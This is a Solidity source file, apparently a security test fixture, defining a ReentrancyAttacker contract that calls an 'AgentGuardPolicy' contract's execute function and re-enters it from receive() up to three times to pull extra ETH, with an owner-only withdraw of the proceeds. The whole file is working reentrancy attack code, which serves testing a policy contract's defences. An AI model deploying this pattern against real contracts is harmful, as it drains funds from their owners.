// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAgentGuardPolicy {
    function execute(
        address payable recipient,
        uint256 amount,
        bytes calldata data
    ) external;
}

contract ReentrancyAttacker {
    IAgentGuardPolicy public target;
    address payable public owner;

    uint256 public attackAmount;
    uint256 public attackAttempts;
    bool public attackEnabled;

    constructor(address targetAddress) {
        target = IAgentGuardPolicy(targetAddress);
        owner = payable(msg.sender);
    }

    function startAttack(uint256 amount) external {
        require(msg.sender == owner, "Not attacker owner");

        attackAmount = amount;
        attackAttempts = 0;
        attackEnabled = true;

        // Initial attempt to make V4 send ETH to this contract.
        target.execute(
            payable(address(this)),
            amount,
            ""
        );
    }

    receive() external payable {
        if (attackEnabled && attackAttempts < 3) {
            attackAttempts++;

            // Try to call V4 again while receiving ETH.
            target.execute(
                payable(address(this)),
                attackAmount,
                ""
            );
        }
    }

    function stopAttack() external {
        require(msg.sender == owner, "Not attacker owner");
        attackEnabled = false;
    }

    function withdraw() external {
        require(msg.sender == owner, "Not attacker owner");

        (bool success, ) = owner.call{
            value: address(this).balance
        }("");

        require(success, "Withdrawal failed");
    }
}